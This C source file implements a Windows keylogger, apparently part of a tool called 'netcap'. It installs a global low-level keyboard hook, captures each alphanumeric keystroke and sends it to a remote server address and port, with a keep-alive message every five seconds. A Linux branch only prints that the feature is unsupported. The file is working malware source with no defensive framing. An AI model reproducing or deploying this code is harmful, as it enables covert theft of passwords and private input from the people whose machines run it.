#include <stdio.h>

#ifdef _WINDOWS
	#define _WINSOCK_DEPRECATED_NO_WARNINGS
	#define WIN32_LEAN_AND_MEAN
	#include <shlobj.h>
	#include <Mmsystem.h>
	#pragma comment(lib,"winmm.lib")
#endif 

#include "netcap_common.h"
#include "client.h"
#include "client_keylogger.h"

#ifdef _WINDOWS 
static int keysPressed = 0; //Lets count the keys pressed
HHOOK hKeyboardHook;

// for keylogger function
unsigned short _port;
const char* _serverip; 
File *_log;

LRESULT WINAPI Keylogger(int nCode, WPARAM wParam, LPARAM lParam)
{
	if ((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
	{
		KBDLLHOOKSTRUCT hooked_key = *((KBDLLHOOKSTRUCT*)lParam);
		DWORD dwMsg = 1;
		dwMsg += hooked_key.scanCode << 16;
		dwMsg += hooked_key.flags << 24;
		char lpszKeyName[1024] = { 0 };
		lpszKeyName[0] = '[';

		int i = GetKeyNameText(dwMsg, (lpszKeyName + 1), 0xFF) + 1;
		int key = hooked_key.vkCode;
		lpszKeyName[i] = ']';
		if ((key >= 'A' && key <= 'Z') || ('0' <= key && key <= '9') || (key >= 'a' && key <= 'z'))
		{
			char buf[2];
			buf[0] = key; buf[1] = 0;
			client_send_buffer("XXX", _serverip, _port, buf, 2, *_log);
			char ts[1024];
			printf("[%s] : send '%c'\n", get_time_stamp2(ts), key);
		}
	}
	return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

int client_keylogger(const char* appname, unsigned short port,
	const char* dirname, int mode2,
	const char* serverip, File &log)
{
	
	_serverip = serverip;
	_port = port;

	int ret = 0;
	char buf[2];
	buf[0] = 1; buf[1] = 0;

	HINSTANCE hins;
	hins = GetModuleHandle(NULL);
	hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)Keylogger, hins, 0);

	MSG msg;
	DWORD start, end;
	start = timeGetTime();

	while (true) {
		if (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		} else {
			end = timeGetTime();
			if ( (end-start) > 5000 ) {  // per 1 sec
				char ts[1024];
				client_send_buffer("XXX", serverip, port, buf, 2, log);
				printf("[%s] : send keep alive code\n", get_time_stamp2(ts));
				start = timeGetTime();
			}
		}
	}

	UnhookWindowsHookEx(hKeyboardHook);
	return 0;
}
#else // _LINUX
int client_keylogger(const char* appname, unsigned short port,
	const char* dirname, int mode2,
	const char* serverip, File &log)
{
	printf("client_keylogger() is not supported in Linux Platrom \n");
	return 0;
}
#endif

